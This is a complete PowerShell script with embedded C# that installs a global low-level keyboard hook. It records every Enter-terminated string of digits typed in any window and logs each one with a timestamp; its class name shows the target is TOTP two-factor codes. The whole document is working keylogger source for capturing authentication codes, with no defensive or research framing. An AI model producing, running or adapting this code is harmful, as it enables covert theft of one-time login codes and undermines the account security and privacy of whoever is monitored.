param(
    [Parameter(Mandatory = $true)]
    [string]$LogPath,
    [switch]$ValidateOnly
)

$ErrorActionPreference = "Stop"
$directory = Split-Path -Parent $LogPath
if ($directory) {
    New-Item -ItemType Directory -Force -Path $directory | Out-Null
}

Add-Type -ReferencedAssemblies System.Windows.Forms -TypeDefinition @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public static class GlobalTotpCapture
{
    private const int WhKeyboardLl = 13;
    private const int WmKeyDown = 0x0100;
    private const int WmSysKeyDown = 0x0104;
    private const int VkReturn = 0x0D;
    private const int Vk0 = 0x30;
    private const int Vk9 = 0x39;
    private const int VkNumpad0 = 0x60;
    private const int VkNumpad9 = 0x69;

    private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

    private static readonly HookProc Callback = HookCallback;
    private static readonly StringBuilder Value = new StringBuilder();
    private static IntPtr hook = IntPtr.Zero;
    private static string logPath;

    public static void Run(string path)
    {
        logPath = path;
        hook = SetHook(Callback);
        if (hook == IntPtr.Zero) {
            throw new System.ComponentModel.Win32Exception(
                Marshal.GetLastWin32Error(), "SetWindowsHookEx failed");
        }
        try {
            Application.Run();
        } finally {
            UnhookWindowsHookEx(hook);
            hook = IntPtr.Zero;
        }
    }

    private static IntPtr SetHook(HookProc callback)
    {
        using (Process process = Process.GetCurrentProcess())
        using (ProcessModule module = process.MainModule) {
            return SetWindowsHookEx(WhKeyboardLl, callback,
                GetModuleHandle(module.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam)
    {
        if (code >= 0 && (wParam == (IntPtr)WmKeyDown ||
                          wParam == (IntPtr)WmSysKeyDown)) {
            int key = Marshal.ReadInt32(lParam);
            if (key >= Vk0 && key <= Vk9) {
                Value.Append((char)key);
            } else if (key >= VkNumpad0 && key <= VkNumpad9) {
                Value.Append((char)('0' + key - VkNumpad0));
            } else if (key == VkReturn && Value.Length != 0) {
                string line = "{\"capturedUtc\":\"" +
                    DateTime.UtcNow.ToString("o") + "\",\"value\":\"" +
                    Value.ToString() + "\"}" + Environment.NewLine;
                File.AppendAllText(logPath, line, new UTF8Encoding(false));
                Console.Write(line);
                Value.Clear();
            }
        }
        return CallNextHookEx(hook, code, wParam, lParam);
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int hookType,
        HookProc callback, IntPtr module, uint threadId);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hook);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hook, int code,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string moduleName);
}
"@

if ($ValidateOnly) {
    Write-Host "Global capture hook compiled successfully."
    exit 0
}

Write-Host "Capturing Enter-terminated digit sequences globally."
Write-Host "Each value is appended to $LogPath; this window need not stay focused."
[GlobalTotpCapture]::Run($LogPath)
